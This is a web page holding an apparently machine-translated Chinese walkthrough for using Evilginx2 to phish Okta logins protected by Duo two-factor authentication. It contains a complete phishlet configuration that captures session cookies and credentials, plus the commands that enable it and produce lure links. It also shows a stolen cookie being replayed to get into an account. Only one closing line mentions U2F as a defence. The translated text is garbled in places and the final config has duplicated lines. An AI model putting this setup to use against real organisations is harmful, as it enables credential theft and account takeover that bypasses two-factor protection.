<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🖖🏽 🤢 🌀 震撼！ 新的网络钓鱼软件赢得第二个因素 👋🏾 👵🏼 ↔️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="大家好！ 


 有时您需要注册某人。 当目标组织配置了第二个身份验证因素时会发生这种情况-短信，Google身份验证器，Duo。 在这种情况下该怎么办？ 雇用gopnik？ 要削减员工电话？ 不行 事实证明，狡猾的黑客已经编写了可以在这种困难情况下提供帮助的软件。 


 Evilginx2是一个...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>震撼！ 新的网络钓鱼软件赢得第二个因素</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/431156/"><p> 大家好！ </p><br><p> 有时您需要注册某人。 当目标组织配置了第二个身份验证因素时会发生这种情况-短信，Google身份验证器，Duo。 在这种情况下该怎么办？ 雇用gopnik？ 要削减员工电话？ 不行 事实证明，狡猾的黑客已经编写了可以在这种困难情况下提供帮助的软件。 </p><a name="habracut"></a><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Evilginx2</a>是一个网络钓鱼框架，可充当受害者和我们要从中接收帐户的站点之间的代理。 以前，他使用自定义nginx，但现在它已在Go上完全重写，其中包括微型HTTP和DNS服务器，从而大大简化了安装和部署。 </p><br><p> 如何运作？ 该软件的作者在其网站上进行了详细<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">描述</a> ，有关安装和配置的详细信息可以在该项目的<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">github</a>页面上找到。 为什么有可能规避第二个因素？ 诀窍在于，我们不会干扰从SMS输入代码/从DUO输入临时密码/推送消息的过程。 我们正在静静地等待用户成功完成所有身份验证步骤，捕获他的cookie，并已将其用于登录。 在此过程中，以防万一我们收集了他的用户名和密码。 在同一张纸条中，我将谈论我的经历以及遇到的陷阱。 </p><br><h4 id="zadacha"> 挑战赛 </h4><br><p> 因此，我们需要提交一个积极使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Okta</a>作为单点登录的办公室。 第二个因素是<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Duo</a> ，该解决方案的解决方案的移动客户端中的芯片使您可以通过常规的推送通知来确认第二个因素，而无需输入35位代码（嗨，Google Authenticator）。 让我们开始吧。 </p><br><h4 id="shag-pervyy---registriruem-fishingovyy-domen"> 第一步-注册网络钓鱼域 </h4><br><p>在我们的提供商的面板中，指定将要进行网络钓鱼的服务器的地址。 我们还注册了<code>okta.&lt; &gt;.com</code>形式的子域<code>okta.&lt; &gt;.com</code> 。 </p><br><p><img src="https://habrastorage.org/webt/xb/oe/nb/xboenbcldeetjfvpdtbdx7kpu6k.png"></p><br><h4 id="shag-vtoroy---nastraivaem-evilginx"> 第二步-配置Evilginx </h4><br><p> 我们启动Evilginx，并通过<code>config</code>命令输入必要的设置。 我们指出主域（不是子域）及其IP。 </p><br><pre> <code class="plaintext hljs">config domain &lt; &gt;.com config ip 10.0.0.1</code> </pre> <br><p> 结果，配置如下所示： </p><br><p><img src="https://habrastorage.org/webt/d-/og/zk/d-ogzkkdfgsv3uc61dyuij7u9o0.png"></p><br><p>  <code>redirect_url</code>参数在这里很有趣-它指示客户端到我们域的根目录时将请求重定向到何处。 为什么要这样做？ 如果您从根目录提供网络钓鱼页面，则会很快计算出该域并将其添加到危险站点列表中，浏览器将发誓，用户将永远无法到达我们。 因此，我们将通过一个唯一的链接给它，根将重定向到歌曲Never Gonna Give You Up。 </p><br><h4 id="shag-tretiy---nastraivaem-fishingovuyu-stranicu"> 第三步-设置网络钓鱼页面 </h4><br><p> 从这里开始乐趣。 因为事实上，在我们的服务器上我们根本不托管任何内容，而仅托管请求，因此我们需要准确地“告诉” Evilginx我们想要接收的数据。 我们以特殊格式编写此“故事”。 其文档可在项目<a href="">Wiki</a>页面上找到。 这些网络钓鱼说明称为。 对于某些流行的服务-facebook，linkedin，亚马逊，它们已经被编写并包含在发行版中。 我们不太幸运，开箱即用不支持Okta，但是好心人为<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">旧</a>版本写了一个phishlet。 我们拿起档案，开始焊接。 </p><br><p> 填写描述，指定网络钓鱼的名称，作者以及所需的Evilginx版本。 </p><br><pre> <code class="plaintext hljs">name: 'okta' author: '@ml_siegel, updated by @hollow1' min_ver: '2.2.0'</code> </pre> <br><p> 我们指出我们要钓鱼的领域。 在我们的例子中，使用<code>&lt;  &gt;.okta.com</code>形式的域。 </p><br><pre> <code class="plaintext hljs">proxy_hosts: - {phish_sub: '', orig_sub: '&lt;   &gt;', domain: 'okta.com', session: true, is_landing: true}</code> </pre> <br><p>  <code>session</code>参数表示正是这个域提供了我们所需的cookie，并将凭据传输到该域， <code>is_landing</code>意味着该主机将用于生成网络钓鱼URL。 </p><br><p> 接下来的重要步骤是识别对目标域的所有请求，以使代理成功将其重写为网络钓鱼域。 如果不这样做，则用户将不会向我们发送数据，而是立即向原始域发送数据，并且我们不会捕获任何帐户。 仅重写那些与用户登录到站点的过程直接相关的请求。 </p><br><p> 为了清楚地了解成功进行身份验证所需的内容，您需要仔细研究此过程。 有了Burp和测试帐户，我们开始搜索密码的传输方式以及应用程序通过哪种cookie确定授权用户。 我们也在从服务器寻找包含原始域链接的答案。 </p><br><p> 我们找到了一个传输登录名和密码的请求。 我们看到它已发送到原始域，但是我们需要离开我们。 </p><br><p><img src="https://habrastorage.org/webt/gl/nm/cs/glnmcsltdem52njp2nu2ns5c4ds.png"></p><br><p> 在这里，您可以看到原始域如何在javascript中呈现链接，需要对其进行重写。 </p><br><p><img src="https://habrastorage.org/webt/g6/x8/mx/g6x8mxyyhdz5jg03eq5hdzg4gbu.png"></p><br><p> 收集了此请求以及更多请求后，我们获得了以下设置： </p><br><pre> <code class="plaintext hljs">sub_filters: - {triggers_on: '&lt; &gt;.okta.com', orig_sub: '&lt; &gt;', domain: 'okta.com', search: 'https://{hostname}/api', replace: 'https://{hostname}/api', mimes: ['text/html', 'application/json']} - {triggers_on: 'login.okta.com', orig_sub: 'login', domain: 'okta.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']} - {triggers_on: '&lt; &gt;.okta.com', orig_sub: '', domain: '&lt; &gt;.okta.com', search: 'https\\x3A\\x2F\\x2F{hostname}', replace: 'https\x3A\x2F\x2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript']} - {triggers_on: '&lt; &gt;.okta.com', orig_sub: '', domain: '&lt; &gt;.okta.com', search: '\\x2Fuser\\x2Fnotifications', replace: 'https\x3A\x2F\x2F&lt; &gt;.okta.com\x2Fuser\x2Fnotifications', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript']}</code> </pre> <br><p> 关键字<code>{hostname}</code>仅用于用网络钓鱼域替换原始域。  <a href="">在此处</a>阅读有关本节语法的更多信息。 </p><br><p> 请记住，我们需要用于登录网站的cookie。 通过反复试验，我们找出cookie名称<code>sid</code> ，并将其添加到设置中： </p><br><pre> <code class="plaintext hljs">auth_tokens: - domain: '&lt; &gt;.okta.com' keys: ['sid']</code> </pre> <br><p> 用户的用户名和密码对我们也有用，我们已经找到了传输用户名和密码的请求。 如您在请求中看到的，我们需要的<code>username</code>和<code>password</code>参数传递给json，我们添加： </p><br><pre> <code class="plaintext hljs">credentials: username: key: 'username' search: '"username":"([^"]*)' type: 'json' password: key: 'password' search: '"password":"([^"]*)' type: 'json'</code> </pre> <br><p> 因此，Evilginx将能够将其与查询隔离并正确保存它们。 </p><br><p> 剩下的很少。 在目标域上指定登录页面的URL。 </p><br><pre> <code class="plaintext hljs">landing_path: - '/login/login.htm'</code> </pre> <br><p> 我们将提供一个URL，通过该URL我们将了解用户已成功登录。 </p><br><pre> <code class="plaintext hljs">auth_urls: - 'app/UserHome'</code> </pre> <br><p> 仅此而已！ 整个配置： </p><br><pre> <code class="plaintext hljs">name: 'okta' author: '@ml_siegel, updated by @hollow1' min_ver: '2.2.0' proxy_hosts: - {phish_sub: '', orig_sub: '&lt;   &gt;'', domain: 'okta.com', session: true, is_landing: true} sub_filters: sub_filters: - {triggers_on: '&lt; &gt;.okta.com', orig_sub: '&lt; &gt;', domain: 'okta.com', search: 'https://{hostname}/api', replace: 'https://{hostname}/api', mimes: ['text/html', 'application/json']} - {triggers_on: 'login.okta.com', orig_sub: 'login', domain: 'okta.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']} - {triggers_on: '&lt; &gt;.okta.com', orig_sub: '', domain: '&lt; &gt;.okta.com', search: 'https\\x3A\\x2F\\x2F{hostname}', replace: 'https\x3A\x2F\x2F{hostname}', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript']} - {triggers_on: '&lt; &gt;.okta.com', orig_sub: '', domain: '&lt; &gt;.okta.com', search: '\\x2Fuser\\x2Fnotifications', replace: 'https\x3A\x2F\x2F&lt; &gt;.okta.com\x2Fuser\x2Fnotifications', mimes: ['text/html', 'application/json', 'application/x-javascript', 'text/javascript']} - domain: '&lt; &gt;.okta.com' keys: ['sid'] credentials: username: key: 'username' search: '"username":"([^"]*)' type: 'json' password: key: 'password' search: '"password":"([^"]*)' type: 'json' landing_path: - '/login/login.htm' auth_urls: - 'app/UserHome'</code> </pre> <br><p> 将其另存为<code>okta.yaml</code>在<code>/usr/share/evilginx/phishlets</code> 。 </p><br><h4 id="shag-chetvertyy---vklyuchaem-nash-novyy-fishing"> 第四步-启用新的网络钓鱼 </h4><br><p> 运行evilginx并编写命令 </p><br><pre> <code class="plaintext hljs">phishlets hostname okta okta.&lt;  &gt;.com</code> </pre> <br><p> 打开网络钓鱼。 </p><br><pre> <code class="plaintext hljs">phishlets enable okta</code> </pre> <br><p> 将自动为其创建一个来自LetsEncrypt的证书。 <br> 检查设置： </p><br><p><img src="https://habrastorage.org/webt/lr/o8/nb/lro8nbdjq8gjmrggwvsgzkv-uwg.png"></p><br><p> 我们指明成功授权后将重定向用户的位置 </p><br><pre> <code class="plaintext hljs">phishlets get-url okta https://&lt; &gt;.okta.com/</code> </pre> <br><p> 应用程序将给出一个需要发送给用户的链接，格式为<code>https://&lt; &gt;.com/login/login.htm?rb=9ffe&amp;ec=&lt; &gt;</code> </p><br><h4 id="shag-4---zhdem-ulov"> 第四步-等待收获 </h4><br><p> 我们发送信件（邮寄技术-另一篇文章的材料）并等待。 <br> 弱的可信任用户会跟随该链接并登录。 我们这样看： </p><br><p><img src="https://habrastorage.org/webt/zy/4y/vz/zy4yvz5-jnl4hvnoj6rqjvqqwrc.png"></p><br><p> 所有捕获的帐户总计为会话。 选择所需的一个并从中复制cookie： </p><br><p><img src="https://habrastorage.org/webt/z7/22/hh/z722hh8g8oxzy8zewtzppg3pa5s.png"></p><br><p> 打开浏览器，替换cookie和瞧-我们在里面： </p><br><p><img src="https://habrastorage.org/webt/1s/jj/mz/1sjjmzgyhysteprri8xzh0cfey4.png"></p><br><h4 id="posleslovie"> 后记 </h4><br><p>  Evilginx极大地简化了网络钓鱼页面的创建，尤其是对于2FA。 而且，这些页面可以方便地存储并与朋友共享。 保护方式-使用<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">U2F</a>标准设备，过渡到新的身份验证<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">方法</a> 。 </p><br><p> 您如何看待上述方法？ 您如何收款？ </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN431156/">https://habr.com/ru/post/zh-CN431156/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN431144/index.html">远场麦克风（麦克风阵列）-智能列中不起眼的英雄</a></li>
<li><a href="../zh-CN431146/index.html">1. Check Point日志分析：Splunk的官方Check Point应用</a></li>
<li><a href="../zh-CN431148/index.html">新的iOS移动企业版。 第1部分：资源代码生成</a></li>
<li><a href="../zh-CN431152/index.html">地铁4号线为期6年。 Metro UI CSS的简要历史</a></li>
<li><a href="../zh-CN431154/index.html">辐射76任务中的缺陷使玩家可以制造核地狱</a></li>
<li><a href="../zh-CN431158/index.html">更多咖啡，更少咖啡因：英特尔第9代（第2部分）</a></li>
<li><a href="../zh-CN431160/index.html">对手绝非偶然-我们采用了超快速的HyperX Alloy FPS RGB键盘</a></li>
<li><a href="../zh-CN431162/index.html">如何制定个人理财计划</a></li>
<li><a href="../zh-CN431164/index.html">Solar JSOC研究：网络犯罪分子变得更加专业</a></li>
<li><a href="../zh-CN431166/index.html">Google提起行政诉讼</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>